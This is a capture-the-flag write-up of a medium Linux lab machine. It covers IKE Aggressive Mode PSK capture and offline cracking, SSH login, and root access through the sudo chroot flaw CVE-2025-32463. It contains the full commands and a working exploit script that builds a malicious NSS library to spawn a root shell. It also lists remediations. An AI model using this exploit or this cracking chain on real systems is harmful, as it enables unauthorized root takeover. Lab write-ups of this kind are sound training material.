<img width="480" height="274" alt="image" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIPptMtdZUVw_OhcFwrK-NhD3JRyPVeVyvRA&s" />

## Machine information

- **Target IP:** 10.10.11.87
    
- **OS:** Linux
    
- **Difficulty:** Medium (network + local privilege escalation)
    
- **Primary attack vectors:** IKE Aggressive Mode (PSK disclosure) → SSH access → local sudo chroot privilege escalation (CVE-2025-32463).
    

---

## Executive summary

This engagement identified an IKE / ISAKMP service on UDP/500 configured in Aggressive Mode that exposed identity material and parameters suitable for offline PSK cracking. Using `ike-scan` and an offline dictionary attack (`psk-crack` with a standard wordlist), the pre-shared key (PSK) was recovered. The PSK permitted SSH authentication for user `ike`, providing user-level access and the user flag. Local enumeration revealed a vulnerable `sudo` version (1.9.17). A public proof-of-concept exploit was executed to obtain a root shell and the root flag. Remediation recommendations include disabling Aggressive Mode, enforcing strong PSKs or using certificate-based authentication, and updating `sudo` to a non-vulnerable version.

---

## Reconnaissance

### TCP port scan (full TCP)

Command used:

```bash
sudo nmap -sS --open -p- -n -Pn 10.10.11.87 ./nmap/scanports
```

Open ports (screenshot):

![[images/Pasted image 20251018131858.png]]

### Version/service probe on SSH

Command used:

```bash
sudo nmap -sCV -p 22 -n -Pn 10.10.11.87 -oN ./nmap/vulnport
```

Output (screenshot):

![[images/Pasted image 20251018133812.png]]

Observation: No obvious remote application vulnerabilities on the scanned TCP ports; further enumeration focused on UDP services.

### UDP port scan

Command used:

```bash
sudo nmap -sUCV -p- --open -n -Pn 10.10.11.87
```

Output (screenshot):

![[images/Pasted image 20251018140100.png]]

Result: UDP/500 (ISAKMP/IKE) is open.

---

## IKE / ISAKMP analysis

Finding: UDP 500 runs IKE/ISAKMP. IKE in Aggressive Mode can expose identity information and PSK-derived data, enabling offline dictionary attacks against the PSK. Aggressive Mode exchanges fewer packets and does not protect identity material, which makes PSK cracking feasible.

Tooling used: `ike-scan` and `psk-crack`.

Command used to fingerprint and collect PSK parameters:

```bash
sudo ike-scan -P -A -M 10.10.11.87
```

Result (screenshot):

![[images/Pasted image 20251018142403.png]]

Important observations from the `ike-scan` output:

- IKE responded in **Aggressive Mode**.
    
- The identity `ike@expressway.htb` was revealed.
    
- Full IKE parameters (cookies, nonces, KE data) were captured for offline cracking.
    

The parameters were saved to a file for cracking:

```bash
sudo ike-scan -A --pskcrack=hash.txt 10.10.11.87
```

Offline cracking with `psk-crack` using `rockyou.txt`:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

Or run `ike-scan` with a dictionary directly:

```bash
ike-scan -M --pskcrack=/usr/share/wordlists/rockyou.txt 10.10.11.87
```

Result: The PSK was recovered in cleartext (screenshot):

![[images/Pasted image 20251018143342.png]]

The recovered key was then used as a password for SSH authentication of the discovered identity.

---

## Initial access — SSH

Because `ike-scan` revealed the identity `ike@expressway.htb`, the recovered PSK was tested via SSH:

Command:

```bash
ssh ike@10.10.11.87
# password: <recovered_psk>
```

Login success (screenshot):

![[images/Pasted image 20251018143649.png]]

Result: User `ike` shell obtained. The user flag was located on the desktop (screenshot):

![[images/Pasted image 20251018143758.png]]

---

## Privilege escalation — sudo chroot (CVE-2025-32463)

### Local enumeration

Checked sudo version:

```bash
sudo -V
```

Output (screenshot):

![[images/Pasted image 20251018144354.png]]

Finding: `sudo` version 1.9.17, which is vulnerable to CVE-2025-32463. The vulnerability allows a local user to influence `sudo`’s chroot behavior so that `sudo -R` may load user-controlled `/etc/nsswitch.conf` and an attacker-controlled NSS shared library, resulting in arbitrary code execution as root.

### Exploit summary

A public proof-of-concept was used on the target. Summary of the exploit steps:

1. Create a temporary chroot directory (`woot`) with a crafted `woot/etc/nsswitch.conf` and a copy of `/etc/group`.
    
2. Compile a shared library that uses a constructor to escalate privileges and spawn `/bin/bash`.
    
3. Run `sudo -R woot woot` to trigger `sudo` to resolve NSS entries inside the chroot and load the malicious NSS library.
    
4. The library constructor runs and spawns a root shell.
    

PoC script used (adapted from public exploit):

```bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

# Trigger
sudo -R woot woot

# cleanup
rm -rf "$STAGE"
```

Execution of the PoC on the target yielded a root shell and the root flag (screenshot):

![[images/Pasted image 20251018145137.png]]

---

## Vulnerability chain

1. **IKE Aggressive Mode disclosure:** Identity and PSK-derived handshake data enabled offline cracking.
    
2. **Weak PSK selection:** PSK found in dictionary allowed recovery with `rockyou.txt`.
    
3. **Credential-based access:** Recovered PSK used to SSH as `ike`.
    
4. **Local software vulnerability:** Vulnerable `sudo` allowed chroot-based escalation to root (CVE-2025-32463).
    

---

## Key lessons and mitigations

- Disable IKE Aggressive Mode on VPN endpoints; prefer Main Mode or certificate-based authentication.
    
- Enforce strong PSKs or use certificate-based authentication. Rotate PSKs and store them in secure vaults.
    
- Patch `sudo` to a fixed release or remove/disable chroot support if it is not required.
    
- Apply least-privilege on local accounts; monitor and restrict `sudo` usage.
    

---

## Conclusion

The compromise path combined a network-protocol weakness (IKE Aggressive Mode with a weak PSK) and an unpatched local privilege-escalation vulnerability in `sudo`. The result was a full compromise of the target. Immediate actions: patch `sudo`, disable Aggressive Mode, enforce stronger authentication, and review VPN and SSH access controls.


